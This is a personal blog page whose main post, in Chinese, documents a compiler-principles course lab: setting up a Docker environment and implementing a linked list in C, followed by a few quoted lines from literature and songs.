<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"qst137.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="苍山岁岁有人去，唯愿洱海生白波。">
<meta property="og:type" content="website">
<meta property="og:title" content="QST2&#39;s BLOG">
<meta property="og:url" content="https://qst137.github.io/index.html">
<meta property="og:site_name" content="QST2&#39;s BLOG">
<meta property="og:description" content="苍山岁岁有人去，唯愿洱海生白波。">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="QST137">
<meta property="article:tag" content="CyberSecurity">
<meta property="article:tag" content="Blockchain">
<meta property="article:tag" content="ChinaRock">
<meta property="article:tag" content="SexWithLove">
<meta property="article:tag" content="Chiikawa">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://qst137.github.io/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>QST2's BLOG</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">QST2's BLOG</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Version: WwJ</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://qst137.github.io/2024/09/20/2024-09-20-%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%20Lab1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="QST137">
      <meta itemprop="description" content="苍山岁岁有人去，唯愿洱海生白波。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="QST2's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/09/20/2024-09-20-%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%20Lab1/" class="post-title-link" itemprop="url">编译原理 Lab1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-09-20 00:00:00 / Modified: 02:29:47" itemprop="dateCreated datePublished" datetime="2024-09-20T00:00:00+08:00">2024-09-20</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/lesson/" itemprop="url" rel="index"><span itemprop="name">lesson</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="编译原理-Lab1"><a href="#编译原理-Lab1" class="headerlink" title="编译原理 Lab1"></a>编译原理 Lab1</h1><p>课程代码也发一下吧；</p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>一看测试程序的 python 源码头：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br></pre></td></tr></table></figure>

<p>linux 环境，干脆弄个 docker 隔离一下：</p>
<p><strong>Dockerfile</strong></p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.13</span>-rc-bookworm</span><br><span class="line"></span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> name=<span class="string">&quot;compilation-principle&quot;</span></span></span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> version=<span class="string">&quot;1.0&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /apps</span></span><br><span class="line"><span class="comment"># to make sure the container never stop itself</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;tail&quot;</span>, <span class="string">&quot;-f&quot;</span>, <span class="string">&quot;/dev/null&quot;</span>]</span></span><br></pre></td></tr></table></figure>

<p>用 docker 构建环境：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker build ./ --tag compilation-principal-labs</span><br><span class="line"><span class="comment"># 6ff7ff597e6d6da7e432e0672cb21c2b7e3dcb85d0cd3858e9b5ea39edf2c4b6</span></span><br><span class="line">docker run -d --name cp-labs-env -v C:/Users/Westj/Desktop/semester5/240900CompilingPrincipal/Labs/vol:/apps 6ff</span><br><span class="line"><span class="comment"># d378173aa930f0d1278a67a5e372adebab9d889da3d933bd3801ae753f02dbfb</span></span><br></pre></td></tr></table></figure>

<p>bash 与 docker 交互：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it d37 /bin/bash</span><br><span class="line"><span class="comment"># root@d378173aa930:/apps#</span></span><br></pre></td></tr></table></figure>

<h2 id="Lab1"><a href="#Lab1" class="headerlink" title="Lab1"></a>Lab1</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. You will complete the following functions (declared in header file) in the linked_list.c file!</span></span><br></pre></td></tr></table></figure>

<p>完成链表定义即可；</p>
<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p><strong>linked_list.h</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> count;</span><br><span class="line">        <span class="type">int</span> value;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; node;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* initialize a linked list, head node is special */</span></span><br><span class="line">node *<span class="title function_">linked_list_init</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* destroy a linked list, free spaces */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">linked_list_free</span><span class="params">(node *head)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* display elements in the linked list */</span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">linked_list_tostring</span><span class="params">(node *head)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* get the length of the linked list */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">linked_list_size</span><span class="params">(node *head)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* insert val at the last of the linked list */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">linked_list_append</span><span class="params">(node *head, <span class="type">int</span> val)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * You should implement functions according to the follow function</span></span><br><span class="line"><span class="comment"> * declarations. One thing to note that, the parameter *index*</span></span><br><span class="line"><span class="comment"> * refers to the position of value node, i.e., index 0 corresponds</span></span><br><span class="line"><span class="comment"> * to the next node of the header node.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * In case of out-of-bound index, your code should do nothing in all</span></span><br><span class="line"><span class="comment"> * functions. As for remove, if the value doesn&#x27;t exist, do nothing.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * For get, if index out of bound, return INT_MIN.</span></span><br><span class="line"><span class="comment"> * For search, if value not exists. return -1.</span></span><br><span class="line"><span class="comment"> * For search_all, if value not exists, return empty list.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* insert val at position index */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">linked_list_insert</span><span class="params">(node *head, <span class="type">int</span> val, <span class="type">int</span> index)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* delete node at position index */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">linked_list_delete</span><span class="params">(node *head, <span class="type">int</span> index)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* remove the first occurence node of val */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">linked_list_remove</span><span class="params">(node *head, <span class="type">int</span> val)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* remove all occurences of val */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">linked_list_remove_all</span><span class="params">(node *head, <span class="type">int</span> val)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* get value at position index */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">linked_list_get</span><span class="params">(node *head, <span class="type">int</span> index)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* search the first index of val */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">linked_list_search</span><span class="params">(node *head, <span class="type">int</span> val)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* search all indexes of val */</span></span><br><span class="line">node *<span class="title function_">linked_list_search_all</span><span class="params">(node *head, <span class="type">int</span> val)</span>;</span><br></pre></td></tr></table></figure>

<p><strong>linked_list.c</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;linked_list.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">node *<span class="title function_">linked_list_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    node *head = (node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    head-&gt;count = <span class="number">0</span>;</span><br><span class="line">    head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">linked_list_free</span><span class="params">(node *head)</span></span><br><span class="line">&#123;</span><br><span class="line">    node *cur = head;</span><br><span class="line">    node *last;</span><br><span class="line">    <span class="keyword">while</span> (cur != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        last = cur;</span><br><span class="line">        cur = cur-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(last);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> linked_list_string[<span class="number">0x10000</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">linked_list_tostring</span><span class="params">(node *head)</span></span><br><span class="line">&#123;</span><br><span class="line">    node *cur = head-&gt;next;</span><br><span class="line">    <span class="type">char</span> *position;</span><br><span class="line">    <span class="type">int</span> length = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (cur != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        position = linked_list_string + length;</span><br><span class="line">        length += <span class="built_in">sprintf</span>(position, <span class="string">&quot;%d&quot;</span>, cur-&gt;value);</span><br><span class="line">        cur = cur-&gt;next;</span><br><span class="line">        <span class="keyword">if</span> (cur != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            position = linked_list_string + length;</span><br><span class="line">            length += <span class="built_in">sprintf</span>(position, <span class="string">&quot;-&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    position = linked_list_string + length;</span><br><span class="line">    length += <span class="built_in">sprintf</span>(position, <span class="string">&quot;%c&quot;</span>, <span class="string">&#x27;\0&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> linked_list_string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">linked_list_size</span><span class="params">(node *head)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> head-&gt;count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">linked_list_append</span><span class="params">(node *head, <span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    node *cur = head;</span><br><span class="line">    node *new_node;</span><br><span class="line">    <span class="keyword">while</span> (cur-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cur = cur-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    new_node = (node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    new_node-&gt;value = val;</span><br><span class="line">    new_node-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    cur-&gt;next = new_node;</span><br><span class="line">    head-&gt;count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* your implementation goes here */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">linked_list_insert</span><span class="params">(node *head, <span class="type">int</span> val, <span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    node *cur = head;</span><br><span class="line">    <span class="keyword">if</span> (index &gt; head-&gt;count || index &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// do nothing</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        node *new_node = (node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">        new_node-&gt;value = val;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; index; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        new_node-&gt;next = cur-&gt;next;</span><br><span class="line">        cur-&gt;next = new_node;</span><br><span class="line">        head-&gt;count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">linked_list_delete</span><span class="params">(node *head, <span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    node *cur = head;</span><br><span class="line">    <span class="keyword">if</span> (index &gt;= head-&gt;count || index &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// do nothing</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; index; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        node *delete_node = cur-&gt;next;</span><br><span class="line">        cur-&gt;next = cur-&gt;next-&gt;next;</span><br><span class="line">        <span class="comment">// free delete_node</span></span><br><span class="line">        <span class="built_in">free</span>(delete_node);</span><br><span class="line">        head-&gt;count--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">linked_list_remove</span><span class="params">(node *head, <span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    node *cur = head;</span><br><span class="line">    <span class="keyword">while</span> (cur-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (cur-&gt;next-&gt;value == val)</span><br><span class="line">        &#123;</span><br><span class="line">            node *remove_node = cur-&gt;next;</span><br><span class="line">            cur-&gt;next = cur-&gt;next-&gt;next;</span><br><span class="line">            <span class="built_in">free</span>(remove_node);</span><br><span class="line">            head-&gt;count--;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cur = cur-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">linked_list_remove_all</span><span class="params">(node *head, <span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    node *cur = head;</span><br><span class="line">    <span class="keyword">while</span> (cur-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (cur-&gt;next-&gt;value == val)</span><br><span class="line">        &#123;</span><br><span class="line">            node *remove_node = cur-&gt;next;</span><br><span class="line">            cur-&gt;next = cur-&gt;next-&gt;next;</span><br><span class="line">            <span class="built_in">free</span>(remove_node);</span><br><span class="line">            head-&gt;count--;</span><br><span class="line">        &#125;</span><br><span class="line">        cur = cur-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">linked_list_get</span><span class="params">(node *head, <span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    node *cur = head;</span><br><span class="line">    <span class="keyword">if</span> (index &gt;= head-&gt;count || index &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> INT_MIN;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; index; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur-&gt;next-&gt;value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">linked_list_search</span><span class="params">(node *head, <span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    node *cur = head;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; head-&gt;count; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (cur-&gt;next-&gt;value == val)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        cur = cur-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">node *<span class="title function_">linked_list_search_all</span><span class="params">(node *head, <span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    node *search_list = linked_list_init();</span><br><span class="line">    node *cur = head;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; head-&gt;count; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (cur-&gt;next-&gt;value == val)</span><br><span class="line">        &#123;</span><br><span class="line">            linked_list_append(search_list, i);</span><br><span class="line">        &#125;</span><br><span class="line">        cur = cur-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> search_list;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p><strong>.&#x2F;vol : &#x2F;apps</strong></p>
<p><img src="https://i.imgur.com/HYXhbwT.png"></p>
<h3 id="编译操作"><a href="#编译操作" class="headerlink" title="编译操作"></a>编译操作</h3><p><code>cd lab1</code> 进入映射的 <code>apps/lab1</code> ，<code>make libll</code> 编译 <code>libll.so</code>：</p>
<p><img src="https://i.imgur.com/Sv2hkZg.png"></p>
<p>编译成功输出，运行测试程序：</p>
<p><img src="https://i.imgur.com/Yr2uY7S.png"></p>
<p>测试通过；</p>
<h2 id="车子"><a href="#车子" class="headerlink" title="车子"></a>车子</h2><p>红拂夜奔；</p>
<blockquote>
<p>他碰上了一件倒霉的事儿，昨天一个不小心，被洛阳留守大尉杨素看上了，要收他做一名东床快婿。这可不是闹着玩儿的。这个东床比太平间还厉害，躺上去就是死人啦！</p>
</blockquote>
<p>跨年孤勇者；</p>
<blockquote>
<p>你破旧的玩偶 你的 面具 你的自我</p>
</blockquote>
<p>华北浪漫革命；</p>
<blockquote>
<p>我面无表情 装作很冷静</p>
